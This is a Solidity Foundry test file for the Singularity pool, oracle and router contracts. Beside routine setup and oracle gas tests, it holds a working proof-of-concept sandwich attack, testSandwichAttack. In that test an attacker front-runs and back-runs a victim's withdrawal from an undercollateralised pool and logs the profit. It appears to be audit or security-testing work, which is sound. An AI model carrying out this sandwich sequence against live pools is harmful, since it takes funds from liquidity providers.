// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import {SingularityPool} from "contracts/SingularityPool.sol";
import {SingularityOracle} from "contracts/SingularityOracle.sol";
import {SingularityFactory} from "contracts/SingularityFactory.sol";
import {SingularityRouter} from "contracts/SingularityRouter.sol";
import {TestChainlinkFeed} from "contracts/testing/TestChainlinkFeed.sol";
import {TestERC20} from "contracts/testing/TestERC20.sol";
import {WFTM} from "contracts/testing/TestWFTM.sol";

struct PriceData {
    uint256 price;
    uint256 updatedAt;
    uint256 nonce;
}

abstract contract BaseState is Test {
    WFTM public immutable wftm;
    TestERC20 public immutable eth;
    TestERC20 public immutable usdc;
    TestERC20 public immutable dai;

    SingularityOracle public oracle;
    SingularityFactory public factory;
    SingularityRouter public router;

    SingularityPool public wftmPool;
    SingularityPool public ethPool;
    SingularityPool public usdcPool;
    SingularityPool public daiPool;

    TestChainlinkFeed public wftmFeed;
    TestChainlinkFeed public ethFeed;
    TestChainlinkFeed public usdcFeed;
    TestChainlinkFeed public daiFeed;

    // fee receiver
    address public immutable otherAddr;
    address public constant attacker = address(0xbadd00d);
    address public constant victim = address(0xb0ffed);

    address[] public assetArray;
    uint256[] public priceArray;
    uint256[] public initialQtyFactorArray;

    constructor() {
        wftm = new WFTM();
        eth = new TestERC20("Ethereum", "ETH", 18);
        usdc = new TestERC20("USC Coin", "USDC", 6);
        dai = new TestERC20("Dai Stablecoin", "DAI", 18);

        otherAddr = genAddr("otherAddr");
    }

    function setUp() public virtual {
        // deploy test tokens
        vm.deal(address(this), 10_000_000 ether);
        wftm.deposit{value: 10_000_000 ether}();

        eth.mint(address(this), 10_000_000 * (10**eth.decimals()));

        usdc.mint(address(this), 10_000_000 * (10**usdc.decimals()));

        dai.mint(address(this), 10_000_000 * (10**dai.decimals()));

        // deploy oracle
        oracle = new SingularityOracle(address(this));
        oracle.setPusher(address(this), true);
        oracle.setOnlyUseChainlink(false);

        assetArray.push(address(wftm));
        assetArray.push(address(eth));
        assetArray.push(address(usdc));
        assetArray.push(address(dai));

        priceArray.push(2 * 1e18);
        priceArray.push(2000 * 1e18);
        priceArray.push(1 * 1e18);
        priceArray.push(1 * 1e18);

        initialQtyFactorArray.push(1);
        initialQtyFactorArray.push(1);
        initialQtyFactorArray.push(2000);
        initialQtyFactorArray.push(2000);

        // update prices
        oracle.pushPrices(assetArray, priceArray);

        wftmFeed = new TestChainlinkFeed(2 * (10**8));
        oracle.setChainlinkFeed(address(wftm), address(wftmFeed));

        ethFeed = new TestChainlinkFeed(2000 * (10**8));
        oracle.setChainlinkFeed(address(eth), address(ethFeed));

        usdcFeed = new TestChainlinkFeed(1 * (10**8));
        oracle.setChainlinkFeed(address(usdc), address(usdcFeed));

        daiFeed = new TestChainlinkFeed(1 * (10**8));
        oracle.setChainlinkFeed(address(dai), address(daiFeed));

        // deploy factory
        factory = new SingularityFactory("Tranche A", address(this), address(oracle), otherAddr);

        // deploy router
        router = new SingularityRouter(address(factory), address(wftm));
        factory.setRouter(address(router));

        // create pools
        wftmPool = SingularityPool(factory.createPool(address(wftm), false, 0.0015e18));
        ethPool = SingularityPool(factory.createPool(address(eth), false, 0.0015e18));
        usdcPool = SingularityPool(factory.createPool(address(usdc), true, 0.0004e18));
        daiPool = SingularityPool(factory.createPool(address(dai), true, 0.0004e18));

        address[] memory assetArray1 = new address[](4);
        assetArray1[0] = address(wftm);
        assetArray1[1] = address(eth);
        assetArray1[2] = address(usdc);
        assetArray1[3] = address(dai);

        uint256[] memory capArray = new uint256[](4);
        capArray[0] = type(uint256).max;
        capArray[1] = type(uint256).max;
        capArray[2] = type(uint256).max;
        capArray[3] = type(uint256).max;

        // set deposit caps
        factory.setDepositCaps(assetArray1, capArray);

        // approvals
        for (uint256 x; x < assetArray.length; ++x) {
            address asset = assetArray[x];
            TestERC20(asset).approve(factory.getPool(asset), type(uint256).max);
            TestERC20(asset).approve(address(router), type(uint256).max);

            vm.startPrank(attacker);
            TestERC20(asset).approve(factory.getPool(asset), type(uint256).max);
            TestERC20(asset).approve(address(router), type(uint256).max);
            vm.stopPrank();

            vm.startPrank(victim);
            TestERC20(asset).approve(factory.getPool(asset), type(uint256).max);
            TestERC20(asset).approve(address(router), type(uint256).max);
            vm.stopPrank();
        }

        // load pools with assets
        _loadPools();
    }

    function genAddr(bytes memory str) internal pure returns (address) {
        return address(bytes20(keccak256(str)));
    }

    function _loadPools() public {
        // preload pools w 1000 tokens each -- 995 from address(this) and 5 from victim
        uint256 length = factory.allPoolsLength();
        for (uint256 x; x < length; ++x) {
            SingularityPool pool = SingularityPool(factory.allPools(x));
            // console.log(address(pool));
            TestERC20 token = TestERC20(pool.token());
            pool.deposit(900 * initialQtyFactorArray[x] * 10**token.decimals(), address(this));
            pool.deposit(100 * initialQtyFactorArray[x] * 10**token.decimals(), address(victim));
        }
    }

    function _setAssets(address addr, uint256 newAssets) public {
        // storage slot 12 => assets
        vm.store(address(addr), bytes32(uint256(12)), bytes32(newAssets));
    }

    function _setLiabilities(address addr, uint256 newLiabilities) public {
        // storage slot 13 => liabilities
        vm.store(address(addr), bytes32(uint256(13)), bytes32(newLiabilities));
    }

    function _displayViewReturnValues() public {
        uint256 length = factory.allPoolsLength();
        for (uint256 x; x < length; ++x) {
            SingularityPool pool = SingularityPool(factory.allPools(x));
            TestERC20 token = TestERC20(pool.token());
            console.log(token.symbol());
            console.log("assets", pool.assets() / 10**token.decimals());
            console.log("liabilities", pool.liabilities() / 10**token.decimals());
            console.log("getPricePerShare", pool.getPricePerShare());
            console.log("getCollateralizationRatio", pool.getCollateralizationRatio());
            console.log("");
        }
        // adjust
    }

    // function testDepositSandwich() public {
    //     ethPool.deposit(10e18, address(this));

    //     console.log("deposit fee", ethPool.getDepositFee(100e18));
    //     console.log("pre g", ethPool._getG(ethPool.getCollateralizationRatio()));

    //     (uint256 _assets, uint256 _liabilities) = ethPool.getAssetsAndLiabilities();
    //     console.log("post g", ethPool._calcCollatalizationRatio(_assets + 100e18, _liabilities + 100e18));

    //     eth.transfer(otherAddr, 1e18);
    //     vm.startPrank(otherAddr);
    //     eth.approve(address(ethPool), type(uint256).max);
    //     ethPool.deposit(1e18, otherAddr);
    //     vm.stopPrank();

    //     // ethPool.withdraw(1000, address(this));
    //     console.log(eth.balanceOf(address(this)));
    //     console.log(ethPool.protocolFees());
    // }

    // function testSandwichZoom() public {
    //     // two pools
    //     // set up an eth pool of cRatio = 0.43
    //     // liabilities in the pool = 100eth
    //     // assets = 43 eth
    //     // large withdraw 5 eth on a hugely undercollaterized pool of eth
    //     // how can an attacker benefit here?
    //     // swap -> out : eth, in : usdc (overcollaterized)
    //     // pre-attack: usdc(undercollaterized) -> eth
    //     // post-attack: eth -> dai (overcollaterized)
    //     // withdraw || withdraw || deposit
    //     // swap || deposit || swap
    // }

    // "Normal" collateralization ratios for reference
    // uint256 constant public newEthAssets = 1000 * 1e18;
    // uint256 constant public newDaiAssets = 1000 * 2000 * 1e18;

    uint256 public constant newEthAssets = 500 * 1e18;
    uint256 public constant newDaiAssets = 500 * 2000 * 1e18;

    function _tweakCollateralizationRatios() public {
        _setAssets(address(ethPool), newEthAssets);
        _setAssets(address(daiPool), newDaiAssets);

        _displayViewReturnValues();
    }
}

contract ContractTest is BaseState {
    function testNormalWithdraw() public {
        _tweakCollateralizationRatios();

        console.log("eth balance of victim before withdraw", eth.balanceOf(victim));
        assertEq(eth.balanceOf(victim), 0);
        uint256 lpBalance = ethPool.balanceOf(victim);
        vm.prank(victim);
        ethPool.withdraw(lpBalance, victim);
        console.log("eth balance of victim after withdraw", eth.balanceOf(victim) / 1e18);

        assertEq(eth.balanceOf(victim), 89942297439575197000); // 5 tokens - fees
    }

    function testSandwichAttack() public {
        _tweakCollateralizationRatios();

        dai.mint(attacker, 200_000 * 1e18);

        console.log("");
        console.log("before front run attacker eth", eth.balanceOf(address(attacker)) / 1e18);
        console.log("before front run attacker dai", dai.balanceOf(address(attacker)) / 1e18);

        // front run
        vm.prank(attacker);
        console.log("attacker front runs, swaps 200_000 dai for eth");
        router.swapExactTokensForTokens(address(dai), address(eth), 200_000 * 1e18, 0, attacker, type(uint256).max);
        console.log("after front run attacker eth", eth.balanceOf(address(attacker)) / 1e18);
        console.log("after front run attacker dai", dai.balanceOf(address(attacker)) / 1e18);

        console.log("new collateralization ratios");
        _displayViewReturnValues();

        uint256 lpBalance = ethPool.balanceOf(victim);
        vm.prank(victim);
        ethPool.withdraw(lpBalance, victim);
        console.log("victim withdraws", eth.balanceOf(victim) / 1e18);
        console.log("(without sandwich, victim could have withdrawn)", uint256(89942297439575197000) / 1e18);

        //back run
        console.log("attacker back runs, swaps all eth for usdc (usdc is overcolatteralized pool)");
        console.log("before back run attacker eth", eth.balanceOf(address(attacker)) / 1e18);

        vm.startPrank(attacker);
        router.swapExactTokensForTokens(
            address(eth),
            address(dai),
            eth.balanceOf(address(attacker)),
            0,
            attacker,
            type(uint256).max
        );

        console.log("after back run attacker eth", eth.balanceOf(address(attacker)) / 1e18);
        console.log("after back run attacker dai", dai.balanceOf(address(attacker)) / 1e18);
        console.log("profit: ", dai.balanceOf(address(attacker)) / 1e18 - 200_000);
    }

    function testGetLatestRoundWith1Prices() public {
        oracle.getLatestRound(address(eth));
    }

    function testOraclePriceDiff() public {
        uint256 price = 1e8;
        uint256 chainlinkPrice = 1.1e8;
        uint256 maxPriceTolerance = 0.015 ether;

        uint256 priceDiff = price > chainlinkPrice ? price - chainlinkPrice : chainlinkPrice - price;
        uint256 percentDiff = (priceDiff * 1 ether) / (price * 100);

        console.log(priceDiff);
        console.log(percentDiff);
        console.log("percentDiff should be greater than maxPriceTolerance");
        console.log(percentDiff > maxPriceTolerance);
    }
}

contract With100Prices is BaseState {
    function setUp() public virtual override {
        super.setUp();
        for (uint256 x; x < 100; ++x) {
            oracle.pushPrices(assetArray, priceArray);
        }
    }

    function testGetLatestRoundWith100Prices() public {
        oracle.getLatestRound(address(eth));
    }
}

contract With1000Prices is BaseState {
    function setUp() public virtual override {
        super.setUp();
        for (uint256 x; x < 1000; ++x) {
            oracle.pushPrices(assetArray, priceArray);
        }
    }

    function testGetLatestRoundWith1000Prices() public {
        oracle.getLatestRound(address(eth));
    }
    function testGetLatestRoundWith1000PriceSTORAGE() public {
        oracle.getLatestRoundStorage(address(eth));
    }
}
